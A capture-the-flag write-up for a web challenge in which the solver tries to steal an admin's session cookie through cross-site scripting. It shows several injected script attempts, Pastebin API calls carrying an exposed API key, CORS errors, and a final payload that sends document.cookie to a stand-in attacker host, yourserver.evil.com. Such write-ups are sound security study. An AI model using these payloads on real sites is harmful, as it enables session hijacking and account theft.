# Cookie Monster

## Web: 200 points

## Challenge

A skid hacker who's out to get me is working on a forum. Right now the only accessible page is
http://challenges.laptophackingcoffee.org:1337/dev.php.

We've found his admin panel at
http://challenges.laptophackingcoffee.org:1337/dev.php?page=admin
and we know he's using cookies for authentication.

Steal his cookies and access the admin panel to delete the site.

He's on the LHC discord server as @Elite Hacker#2489, He's expecting his buddy Jerry to send him a link with some documentation, maybe you can use that information somehow?

[ [Start](http://challenges.laptophackingcoffee.org:1337/dev.php) ]

Note: The server resets to default every 30 minutes. All progress will be lost

## Solution

what am I suppose to do for the Cookie Monster challenge? I see that it has a XSS vuln and I'm pretty sure I'm suppose to send a cookie logger to the Elite Hacker#2489 and then add his cookie to mine to get the flag-
i'm clearly stupid as you can tell, so i have no idea how to do this or if i'm doing this correct..

```javascript
<script>
var node1 = document.createElement("div");
var textnode = document.createTextNode(document.cookie);
node1.appendChild(textnode);
var node2 = document.createElement("div");
node2.appendChild(textnode);
document.body.appendChild(node1);
document.body.appendChild(node2);
</script>
```

```javascript
<script>
document.body.innerHTML += "hello world";
</script>
```

Pastebin
```javascript
// 1. api_dev_key - which is your unique API Developers Key.
// 2. api_option - set as paste, this will indicate you want to create a new paste.
// 3. api_paste_code - this is the text that will be written inside your paste.
<script>
let data = {api_dev_key: "ef18a18477ac0ba892c5ecef221bc779", api_option: "paste", api_paste_code: "hello world"};

fetch("https://pastebin.com/api/api_post.php", {
  method: "POST", 
  body: JSON.stringify(data)
}).then(res => {
  console.log("Request complete! response:", res);
});
</script>
```

```
Access to fetch at 'https://pastebin.com/api/api_post.php' from origin 'http://challenges.laptophackingcoffee.org:1337' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
```

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://pastebin.com/api/api_post.php", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    api_dev_key: "ef18a18477ac0ba892c5ecef221bc779", 
    api_option: "paste", 
    api_paste_code: "hello world"
}));
</script>
```

```
Access to XMLHttpRequest at 'https://pastebin.com/api/api_post.php' from origin 'http://challenges.laptophackingcoffee.org:1337' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

```
<script>
document.write('<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />')
</script>
```

* https://www.w3schools.com/tags/tag_script.asp
* https://www.w3schools.com/jsref/met_node_appendchild.asp
* https://pastebin.com/api
* https://stackoverflow.com/questions/6396101/pure-javascript-send-post-data-without-a-form
* https://security.stackexchange.com/questions/49185/xss-cookie-stealing-without-redirecting-to-another-page